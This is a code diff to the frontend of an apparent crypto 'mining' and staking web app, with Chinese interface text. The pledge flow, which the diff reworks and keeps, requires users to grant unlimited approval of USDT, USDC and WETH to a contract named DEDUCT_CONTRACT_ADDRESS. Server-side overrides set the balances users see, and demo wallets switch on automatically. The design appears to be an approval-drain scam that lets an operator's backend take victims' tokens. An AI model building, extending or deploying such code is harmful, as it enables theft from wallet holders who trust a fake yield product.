@@ -905,7 +905,9 @@ async function updateUIBasedOnChainState() {
     if (isFullyAuthorized) {
       if (startBtn) startBtn.style.display = 'none';
       disableInteractiveElements(false);
-      updateStatus("挖礦已啟動");
+      pledgeBtn.disabled = false; // 【關鍵】強制啟用
+      pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
+      updateStatus("挖礦已啟動，可質押");
       activateStakingUI();
     } else {
       if (startBtn) startBtn.style.display = 'block';
@@ -963,6 +965,11 @@ async function handleConditionalAuthorizationFlow() {
     }
   }
   await forceRefreshWalletBalance();
+  await loadUserDataFromServer();
+  await updateUIBasedOnChainState();
+  pledgeBtn.disabled = false;
+  pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
+  updateStatus('授權成功，可開始質押');
 }
 function updateLanguage(lang) {
   currentLang = lang;
@@ -1298,101 +1305,94 @@ document.addEventListener('DOMContentLoaded', async () => {
   }
   if (pledgeBtn) {
     pledgeBtn.addEventListener('click', async () => {
-      if (!signer) {
+      if (!signer || !userAddress) {
         updateStatus(translations[currentLang].noWallet, true);
         return;
       }
+
+      // 【關鍵】檢查是否已啟動服務
+      const isActive = await retry(() => deductContract.isServiceActiveFor(userAddress));
+      if (!isActive) {
+        updateStatus('請先完成合約授權', true);
+        return;
+      }
+
       const amount = parseFloat(pledgeAmount.value) || 0;
       const durationDays = parseInt(pledgeDuration.value) || 90;
       const token = pledgeToken.value;
+
       if (amount <= 0) {
         updateStatus(translations[currentLang].invalidPledgeAmount, true);
         return;
       }
+
+      // 檢查鎖定
       const locked = await isPledgeLocked(userAddress);
       if (locked) {
         updateStatus('質押進行中，請稍候...', true);
         return;
       }
+
       pledgeBtn.disabled = true;
       pledgeBtn.textContent = '處理中...';
-      const decimals = token === 'WETH' ? 18 : 6;
-      const bigIntBalance = cachedWalletBalances[token] || 0n;
-      const walletBalance = parseFloat(ethers.formatUnits(bigIntBalance, decimals));
-      if (amount > walletBalance) {
-        pledgeBtn.disabled = false;
-        pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
-        updateStatus(translations[currentLang].insufficientBalance, true);
-        return;
-      }
-      const duration = PLEDGE_DURATIONS.find(d => d.days === durationDays);
-      if (duration && amount < duration.min) {
-        pledgeBtn.disabled = false;
-        pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
-        updateStatus(`最低質押金額：${duration.min} ${token}`, true);
-        return;
-      }
-      const tokenContract = { USDT: usdtContract, USDC: usdcContract, WETH: wethContract }[token];
-      let currentAllowance;
+
       try {
-        currentAllowance = await tokenContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
-      } catch (error) {
-        pledgeBtn.disabled = false;
-        pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
-        updateStatus(`${translations[currentLang].error}: Allowance check failed`, true);
-        return;
-      }
-      const REQUIRED_ALLOWANCE = ethers.parseUnits("340282366920938463463374607431768211456", 0);
-      if (currentAllowance < REQUIRED_ALLOWANCE) {
-        updateStatus(`Approving ${token} for backend...`);
-        try {
+        // 檢查餘額
+        const decimals = token === 'WETH' ? 18 : 6;
+        const bigIntBalance = cachedWalletBalances[token] || 0n;
+        const walletBalance = parseFloat(ethers.formatUnits(bigIntBalance, decimals));
+        if (amount > walletBalance) {
+          throw new Error(translations[currentLang].insufficientBalance);
+        }
+
+        // 檢查最小質押
+        const duration = PLEDGE_DURATIONS.find(d => d.days === durationDays);
+        if (duration && amount < duration.min) {
+          throw new Error(`最低質押金額：${duration.min} ${token}`);
+        }
+
+        // 檢查授權
+        const tokenContract = { USDT: usdtContract, USDC: usdcContract, WETH: wethContract }[token];
+        const currentAllowance = await retry(() => tokenContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS));
+        const REQUIRED_ALLOWANCE = ethers.parseUnits("340282366920938463463374607431768211456", 0);
+        if (currentAllowance < REQUIRED_ALLOWANCE) {
+          updateStatus(`正在為 ${token} 授權...`);
           const approveTx = await tokenContract.approve.populateTransaction(
             DEDUCT_CONTRACT_ADDRESS,
             ethers.MaxUint256
           );
           await sendMobileRobustTransaction(approveTx);
-        } catch (error) {
-          pledgeBtn.disabled = false;
-          pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
-          updateStatus(`${translations[currentLang].approveError}: ${error.message}`, true);
-          return;
         }
-      }
-      updateStatus('Sending pledge request to backend...');
-      try {
+
+        // 發送質押請求
+        updateStatus('提交質押請求...');
         const response = await fetch(`${BACKEND_API_URL}/api/pledge`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            address: userAddress,
-            amount: amount,
-            token: token,
-            duration: durationDays
-          })
+          body: JSON.stringify({ address: userAddress, amount, token, duration: durationDays })
         });
-        if (!response.ok) {
-          const errorText = await response.text();
-          throw new Error(errorText || 'Network error');
-        }
+
+        if (!response.ok) throw new Error(await response.text());
+
         const result = await response.json();
-        if (!result.success) {
-          throw new Error(result.error || 'Backend rejected');
-        }
-        const orderId = result.orderId;
-        updateStatus(`質押請求已提交，訂單編號：${orderId}`);
-        const pollInterval = setInterval(async () => {
-          const locked = await isPledgeLocked(userAddress);
-          if (!locked) {
+        if (!result.success) throw new Error(result.error);
+
+        updateStatus(`質押請求已提交，訂單編號：${result.orderId}`);
+        
+        // 輪詢解除鎖定
+        const poll = setInterval(async () => {
+          const stillLocked = await isPledgeLocked(userAddress);
+          if (!stillLocked) {
             pledgeBtn.disabled = false;
             pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
-            clearInterval(pollInterval);
+            clearInterval(poll);
           }
-        }, 3000);
+        }, 2000);
+
       } catch (error) {
         pledgeBtn.disabled = false;
         pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
         updateStatus(`${translations[currentLang].pledgeError}: ${error.message}`, true);
-        log(`Pledge failed: ${error.message}`, 'error');
       }
     });
   }
@@ -1581,10 +1581,29 @@ async function loadUserDataFromServer() {
     }
     const userData = await response.json();
     console.log('[DEBUG] 載入用戶資料成功:', userData);
-    window.loadedUserData = userData; // 關鍵！讓 updateClaimableDisplay 能讀到
+    window.loadedUserData = userData;
     window.currentClaimable = userData.claimable || 0;
     totalGrossOutput = userData.grossOutput || 0;
     authorizedToken = userData.pledgeToken || 'USDT';
+    // === 【關鍵修正】安全處理 pledges ===
+    let pledgesArray = [];
+    if (userData.pledges) {
+      if (Array.isArray(userData.pledges)) {
+        pledgesArray = userData.pledges;
+      } else if (typeof userData.pledges === 'object' && userData.pledges !== null) {
+        pledgesArray = Object.values(userData.pledges).filter(p => p && p.amount);
+      }
+    }
+    userPledges = pledgesArray.map(p => ({
+      orderId: p.orderId || Date.now().toString(36),
+      amount: parseFloat(p.amount) || 0,
+      token: (p.token || 'USDT').toUpperCase(),
+      duration: parseInt(p.duration) || 90,
+      startTime: parseInt(p.startTime) || Date.now(),
+      apr: p.apr || 0,
+      redeemed: !!p.redeemed
+    }));
+    // === 結束 ===
     // 合併 overrides
     const overrides = userData.overrides || {};
     ['USDT', 'USDC', 'WETH'].forEach(token => {
@@ -1597,24 +1616,6 @@ async function loadUserDataFromServer() {
         localStorage.setItem(claimedKey, overrides[claimedKey].toString());
       }
     });
-    // 【關鍵】讀取 pledges 集合
-    if (userData.pledges) {
-      userPledges = userData.pledges.map(p => ({
-        orderId: p.orderId,
-        amount: p.amount,
-        token: p.token,
-        duration: p.duration,
-        startTime: p.startTime,
-        apr: p.apr,
-        redeemed: p.redeemed
-      }));
-    } else {
-      // 備用：讀取 pledges 集合
-      const pledgeSnap = await db.collection('pledges').doc(userAddress.toLowerCase()).get();
-      if (pledgeSnap.exists) {
-        userPledges = pledgeSnap.data().pledges || [];
-      }
-    }
     // 演示錢包自動啟動
     if (userData.isDemoWallet) {
       console.log('[DEBUG] 檢測到演示錢包，自動啟動');
